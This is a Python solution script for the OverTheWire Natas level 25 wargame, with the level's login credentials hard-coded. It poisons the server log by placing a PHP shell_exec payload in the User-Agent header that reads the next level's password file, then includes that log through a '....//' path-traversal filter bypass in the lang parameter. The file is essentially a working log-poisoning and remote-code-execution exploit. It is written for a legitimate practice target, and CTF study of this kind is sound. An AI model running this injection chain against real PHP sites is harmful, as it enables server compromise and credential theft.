import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

url = "http://natas25.natas.labs.overthewire.org/"


def send_request() -> str:
    first_url = url + f"?lang=de"
    print(f"Sending request to [{first_url}]...")
    user_agent = "<?php echo shell_exec('cat /etc/natas_webpass/natas26');?>"
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'User-Agent': user_agent}
    session = requests.Session()
    _ = session.get(first_url,
                    headers=headers,
                    auth=basic_auth,
                    verify=False)
    session_id = session.cookies.get_dict()['PHPSESSID']
    second_url = url + \
        f"?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_{session_id}.log"
    response = session.get(second_url,
                           headers=headers,
                           auth=basic_auth,
                           verify=False)
    return response.text


if __name__ == '__main__':
    print(send_request())
